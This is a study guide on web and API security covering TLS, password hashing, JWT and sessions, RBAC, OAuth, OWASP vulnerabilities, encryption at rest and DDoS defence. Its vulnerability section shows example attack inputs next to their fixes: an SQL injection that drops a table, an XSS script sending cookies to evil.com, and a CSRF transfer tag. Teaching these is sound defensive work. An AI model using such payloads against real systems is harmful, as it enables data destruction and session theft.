# 13 — Security

## TL;DR
> Never trust the client. Encrypt everything in transit (TLS) and at rest.  
> OAuth2 for delegated access; JWT for stateless auth. Zero-trust: verify every request.  
> Defense in depth — multiple layers of security, not just a perimeter.

---

## 1. Core Security Principles

| Principle | Description |
|-----------|-------------|
| **Defense in Depth** | Multiple security layers; no single point of failure |
| **Least Privilege** | Grant minimum permissions needed |
| **Zero Trust** | Verify every request; never implicitly trust internal traffic |
| **Fail Secure** | On error, deny access (not grant it) |
| **Input Validation** | Never trust client input; validate and sanitize everything |
| **Separation of Duties** | Critical operations require multiple approvals |

---

## 2. TLS/HTTPS

All traffic should be encrypted in transit.

### TLS 1.3 (Current Standard)
```
Client                              Server
  │──── ClientHello ──────────────▶│  (TLS version, cipher suites, key share)
  │◀─── ServerHello ───────────────│  (chosen cipher, server key share, cert)
  │──── Finished (encrypted) ─────▶│  (client verifies cert, derives session keys)
  │◀─── Application Data ──────────│  (communication begins in 1-RTT)
```

### Certificate Pinning
```
Mobile app hardcodes server's certificate fingerprint.
Even if CA is compromised, connection rejected unless cert matches.

Risk: app must update if cert rotates → use Public Key Pinning instead.
```

### mTLS (Mutual TLS)
Both client AND server authenticate via certificates:
```
Service A ──presents cert──▶ Service B
Service A ◀──presents cert── Service B
Both verify each other's certificates
```
Used by: **Service Mesh** (Istio), internal microservices.

### HSTS (HTTP Strict Transport Security)
```
Server responds with:
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Browser remembers: always use HTTPS for this domain for 1 year
→ Prevents downgrade attacks
```

---

## 3. Authentication

### Password Storage
```
NEVER store plain text or simple hash:
  ❌ plain: "password123"
  ❌ md5:   "482c811da5d5b4bc6d497ffa98491e38"
  ❌ sha256: (still breakable with rainbow tables)

✅ Correct: bcrypt / Argon2 / scrypt
  $argon2id$v=19$m=65536,t=3,p=4$randomSalt$hashedPassword

  - Intentionally slow (1000s of ms to hash)
  - Salt prevents rainbow table attacks
  - Increasing cost factor as hardware improves
```

### JWT (JSON Web Token)
```
Format: Header.Payload.Signature
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (header: algo=HS256)
  .eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzAwMDAwMDAwfQ (payload)
  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c (signature)

Payload (decoded):
{
  "sub": "user123",
  "role": "admin",
  "iat": 1699000000,  // issued at
  "exp": 1699003600   // expires in 1 hour
}

Verification (no DB call needed!):
  Server recomputes HMAC(header + payload, secret_key)
  Compares with signature in token
  If matches + not expired → valid
```

**JWT Security Rules:**
- Use `RS256` (asymmetric) for distributed systems — sign with private key, verify with public key
- Use short expiry (15-60 min) + refresh tokens
- Validate `exp`, `iss`, `aud` claims
- Never store sensitive data in payload (base64, not encrypted)
- Revocation: maintain token blacklist in Redis (by `jti` claim) OR just use short TTL

### Refresh Token Pattern
```
Login → Access Token (15min TTL) + Refresh Token (7-day TTL, stored in httpOnly cookie)

Access Token expires:
  Client ──POST /auth/refresh (with refresh token cookie)──▶ Auth Server
  Auth Server validates refresh token (checks DB/Redis)
  Returns new Access Token

Logout:
  Invalidate refresh token in DB → future refreshes fail
```

### Session-Based Authentication
```
Login → Server creates session in Redis:
  session:abc123 → { user_id: 123, role: admin, created_at: ... }
  
Client gets cookie: session_id=abc123 (httpOnly, Secure)

Subsequent requests:
  Client sends cookie → Server looks up session:abc123 in Redis → valid
  
Logout: DEL session:abc123 from Redis → immediately revoked
```

| Feature | JWT | Session |
|---------|-----|---------|
| Storage | Client-side (stateless) | Server-side (stateful) |
| Revocation | Hard (need blacklist) | Easy (delete from Redis) |
| Scalability | Easy (no shared state) | Need shared session store |
| Payload size | Grows with claims | Just a session ID |

---

## 4. Authorization

### RBAC (Role-Based Access Control)
```
Roles: Admin, Editor, Viewer

Admin:  read + write + delete
Editor: read + write
Viewer: read only

User has role(s) → role has permissions → check permission on action

if user.role == "admin":
    allow delete
else:
    deny
```

### ABAC (Attribute-Based Access Control)
More flexible — decisions based on attributes of user, resource, environment:
```
Allow if:
  user.department == "finance" AND
  resource.type == "financial_report" AND
  time.current between "09:00" and "17:00" AND
  request.ip in OFFICE_IP_RANGE
```

### OAuth 2.0 Authorization
```
Resource Owner (User) grants access to Client App to access their data on Resource Server.

Scopes (fine-grained permissions):
  read:profile → read user profile
  write:posts  → create/edit posts
  delete:account → delete account (rare to grant)

Client requests only scopes it needs.
```

---

## 5. Common Vulnerabilities (OWASP Top 10)

### SQL Injection
```sql
❌ Vulnerable:
  query = "SELECT * FROM users WHERE name = '" + userInput + "'"
  userInput = "'; DROP TABLE users; --"
  → Executes: SELECT * FROM users WHERE name = ''; DROP TABLE users; --

✅ Fix: Parameterized queries (prepared statements)
  db.Query("SELECT * FROM users WHERE name = $1", userInput)
```

### XSS (Cross-Site Scripting)
```html
❌ Vulnerable:
  <div>Hello, {userInput}</div>
  userInput = "<script>document.location='https://evil.com?c='+document.cookie</script>"

✅ Fix: Escape output, Content Security Policy (CSP), use frameworks that auto-escape
  Content-Security-Policy: default-src 'self'; script-src 'nonce-random123'
```

### CSRF (Cross-Site Request Forgery)
```
Attacker's site has:
  <img src="https://bank.com/transfer?to=attacker&amount=1000">

If user is logged into bank (has valid cookie) → request executes!

✅ Fix: CSRF token (server generates per-form token; verify on submission)
       SameSite=Strict cookie attribute
       Check Origin/Referer header
```

### Broken Authentication
- Weak passwords, no rate limiting on login
- Sessions not invalidated on logout
- JWT with `alg: none` accepted

**Fixes**: bcrypt, account lockout, MFA, proper session management

### IDOR (Insecure Direct Object Reference)
```
❌ Vulnerable:
  GET /invoices/1234   (user A's invoice)
  Attacker changes to:
  GET /invoices/1235   (user B's invoice — no authorization check!)

✅ Fix: Always check: "does the current user own this resource?"
  invoice = db.GetInvoice(id: 1234)
  if invoice.UserID != currentUser.ID:
      return 403 Forbidden
```

---

## 6. API Security

### Input Validation
```go
// Always validate on server side (never trust client)
if req.Amount <= 0 || req.Amount > 1_000_000 {
    return ErrInvalidAmount
}
if len(req.Description) > 500 {
    return ErrDescriptionTooLong
}
```

### Rate Limiting
- 429 Too Many Requests when limit hit
- Per IP, per user, per API key

### Security Headers
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

---

## 7. Encryption at Rest

### Database Encryption
- **TDE (Transparent Data Encryption)**: DB encrypts files on disk automatically
- Application-level encryption: encrypt specific columns (e.g., SSN, credit card)
  ```
  encrypted_ssn = AES256_encrypt(ssn, data_encryption_key)
  ```

### Key Management
```
Envelope Encryption:
  Data Encryption Key (DEK) → encrypts your data
  Key Encryption Key (KEK) → encrypts the DEK
  KEK stored in HSM / KMS (AWS KMS, HashiCorp Vault)

Rotate DEKs periodically.
Revoke KEK → all data inaccessible (useful for tenant deletion).
```

---

## 8. DDoS Protection

### Types of DDoS
| Layer | Attack | Defense |
|-------|--------|---------|
| L3/L4 | Volumetric (UDP flood, ICMP flood) | Upstream filtering, BGP blackholing |
| L4 | SYN flood | SYN cookies |
| L7 | HTTP flood, Slowloris | Rate limiting, WAF, CAPTCHAs |

### Defense Layers
```
Internet ──▶ Anycast Network (Cloudflare) ──▶ WAF ──▶ Rate Limiter ──▶ App
              (absorbs volumetric)            (L7 rules)
```

**Cloudflare / Akamai**: absorb traffic at the edge, filtering at ~300 Tbps capacity.

**WAF (Web Application Firewall)**: rules to block SQL injection, XSS, known attack patterns.

---

## 9. Zero-Trust Architecture

Traditional: "Trust internal network, distrust external"
Zero-Trust: "Never trust, always verify — regardless of network location"

```
Service A ──▶ Service B (internal)

Zero-Trust checks:
  1. Is Service A authenticated? (mTLS certificate)
  2. Is Service A authorized to call this endpoint?
  3. Is this request anomalous? (rate, time, location)
```

**Principles:**
- mTLS between all services
- Short-lived credentials (rotate often)
- Explicit authorization per call, not per network zone
- Audit log every access

---

## Key Takeaways

1. **TLS everywhere** — HTTP only on localhost; mTLS for internal services
2. **bcrypt/Argon2** for passwords — never plain SHA/MD5
3. **JWT**: short TTL (15min) + refresh tokens; validate `exp`, `iss`, `aud`
4. **Parameterized queries** always — no string interpolation in SQL
5. **Input validation** server-side for every field — client can be bypassed
6. **RBAC** for role-based access; check ownership for every resource (prevent IDOR)
7. **Rate limit login** and sensitive endpoints — prevent brute force and credential stuffing
8. **Zero-trust**: verify identity + authorization on every request, even internal
